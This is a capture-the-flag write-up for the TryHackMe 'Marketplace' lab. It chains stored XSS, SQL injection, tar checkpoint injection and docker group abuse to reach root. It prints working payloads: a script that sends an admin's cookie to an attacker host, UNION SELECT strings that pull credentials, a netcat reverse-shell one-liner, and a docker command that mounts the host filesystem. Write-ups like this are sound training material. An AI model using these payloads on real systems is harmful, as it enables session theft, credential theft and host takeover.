# 🛒 TryHackMe — Marketplace

> **Difficulty:** Hard | **OS:** Linux | **Category:** Web / Privilege Escalation
> **Author:** Aryan Barkhordar

---

## Table of Contents

- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
  * [Port Scanning](#port-scanning)
  * [Web Enumeration](#web-enumeration)
- [Exploitation](#exploitation)
  * [Stored XSS — Listing Title Injection](#stored-xss--listing-title-injection)
  * [Administrator Session Hijacking](#administrator-session-hijacking)
  * [SQL Injection — Admin Panel](#sql-injection--admin-panel)
  * [Credential Extraction from Database](#credential-extraction-from-database)
  * [SSH Access as `jake`](#ssh-access-as-jake)
- [Privilege Escalation](#privilege-escalation)
  * [Lateral Movement — Backup Script Abuse](#lateral-movement--backup-script-abuse)
  * [Docker Group Abuse — Root Access](#docker-group-abuse--root-access)
- [Flags](#flags)
- [Summary](#summary)

---

## Overview

**Marketplace** is a TryHackMe machine built around a chain of web vulnerabilities and privilege escalation techniques. The attack surface begins with a marketplace web application vulnerable to **Stored XSS**, which is weaponised to steal an administrator's session cookie via a report mechanism. With admin access, the admin panel is found to be vulnerable to **SQL Injection**, which leaks SSH credentials from the database. SSH access as `jake` reveals a sudo rule allowing execution of a backup script as `michael` — which is abused via a `tar` checkpoint injection to obtain a shell as `michael`. Crucially, `michael` is a member of the **Docker group**, which is leveraged to mount the host filesystem inside a container and achieve root.

**Attack Chain:**

```
nmap → Web Enumeration → Stored XSS → Admin Cookie Theft
→ Admin Panel Access → SQL Injection → SSH Credentials
→ SSH as jake → Backup Script Abuse → Shell as michael
→ Docker Group Abuse → Root
```

---

## Reconnaissance

### Port Scanning

An `nmap` service scan of the target identified three open ports:

```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
32768/tcp open  http
```

> **Key Finding:** Two HTTP services were present — one on the standard port 80 (the Marketplace application) and one on port 32768, which warranted further investigation.

---

### Web Enumeration

Navigating to `http://<TARGET>` presented a marketplace web application allowing users to register, log in, and create listings. After registering an account, the following behaviours were observed:

- Authenticated users could create marketplace listings with a title and description.
- A **Report** button was available on each listing, with the application stating: *"One of our admins will evaluate whether the listing you reported breaks our guidelines."*

> **Key Observation:** The report mechanism implied an administrator would actively view user-controlled content — a strong indicator that a client-side attack such as XSS could be used to steal the admin's session.

---

## Exploitation

### Stored XSS — Listing Title Injection

The listing title field was tested for Cross-Site Scripting by submitting:

```html
<script>alert("Hello")</script>
```

The alert fired when the listing was viewed, confirming the field was vulnerable to **Stored XSS** — injected JavaScript persisted in the database and executed in any browser that loaded the listing.

---

### Administrator Session Hijacking

With XSS confirmed, a cookie-stealing payload was crafted and submitted as a new listing title:

```html
<script>
fetch('http://<ATTACKER>:4444/steal?cookie=' + btoa(document.cookie));
</script>
```

A Python HTTP server was started on the attacker machine to receive the incoming request:

```
python3 -m http.server 4444
```

The malicious listing was then **reported**, triggering an admin review. Shortly after, a second HTTP request arrived at the listener — containing a distinct session cookie belonging to the administrator.

The captured cookie was injected into the browser via DevTools, replacing the current session. Upon refreshing, an **Administration Panel** became accessible, confirming the cookie belonged to an admin account.

> **Flag 1** was located within the Administration Panel.

---

### SQL Injection — Admin Panel

The admin panel's URL contained a `user` parameter:

```
/admin?user=0
```

Submitting a single quote caused a database error, indicating the parameter was being passed unsanitised to an SQL query. Column enumeration was performed using `UNION SELECT`:

```
/admin?user=0 UNION SELECT 1,2,3-- -    → Error
/admin?user=0 UNION SELECT 1,2,3,4-- - → Success
```

The underlying query returned **four columns**.

---

### Credential Extraction from Database

With the column count confirmed, the `marketplace.messages` table was queried to extract its contents:

```
/admin?user=0 UNION SELECT 1,group_concat(id,':',message_content,':',user_from,':',user_to,'\n'),3,4 FROM marketplace.messages-- -
```

The results included an automated system message containing **plaintext SSH credentials** for the user `jake`.

---

### SSH Access as `jake`

The extracted credentials were used to authenticate via SSH:

```
ssh jake@<TARGET>
```

Access was confirmed. The **user flag** was located in Jake's home directory:

```
$ cat /home/jake/user.txt
THM{REDACTED}
```

---

## Privilege Escalation

### Lateral Movement — Backup Script Abuse

Checking Jake's sudo permissions:

```
sudo -l
```

The output revealed:

```
(michael) NOPASSWD: /opt/backups/backup.sh
```

Jake could run the backup script as `michael` without a password. Inspecting the script confirmed it used `tar` to archive a directory — and `tar` is vulnerable to checkpoint-based command injection.

The following files were created in the directory being archived:

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER> 4445 >/tmp/f" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
chmod 777 shell.sh
```

With a Netcat listener running on port 4445, the backup script was executed:

```
sudo -u michael /opt/backups/backup.sh
```

A shell was received as `michael`. Identity was confirmed:

```
$ id
uid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker)
```

> **Key Observation:** `michael` was a member of the **`docker` group** — a well-known privilege escalation vector that provides effective root access to the host.

---

### Docker Group Abuse — Root Access

Available Docker images were enumerated:

```
docker image ls
```

An `alpine` image was present. The host filesystem was mounted inside a container using a `chroot` to break out to the host as root:

```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

The `-v /:/mnt` flag mounted the entire host filesystem inside the container under `/mnt`. The `chroot /mnt` command then changed the root directory to the host filesystem, resulting in a root shell on the host.

The **root flag** was retrieved to complete the machine:

```
# cat /root/root.txt
THM{REDACTED}
```

---

## Flags

| Flag           | Value           |
| -------------- | --------------- |
| 🏳️ **Flag 1**  | `THM{REDACTED}` |
| 🏳️ **User**    | `THM{REDACTED}` |
| 🚩 **Root**     | `THM{REDACTED}` |

---

## Summary

| Stage                       | Technique                                                                            |
| --------------------------- | ------------------------------------------------------------------------------------ |
| **Recon**                   | `nmap` scan, web application enumeration                                             |
| **Stored XSS**              | Malicious listing title → admin cookie theft via report mechanism                    |
| **Admin Access**            | Stolen session cookie injected via DevTools                                          |
| **SQL Injection**           | `UNION SELECT` on `/admin?user=` parameter → SSH credentials from messages table     |
| **Initial SSH Access**      | SSH as `jake` with extracted credentials                                             |
| **Lateral Movement**        | `sudo -u michael /opt/backups/backup.sh` → `tar` checkpoint injection → shell        |
| **Privilege Escalation**    | `michael` in `docker` group → `docker run -v /:/mnt chroot` → root shell            |

---

*Writeup by Aryan Barkhordar*
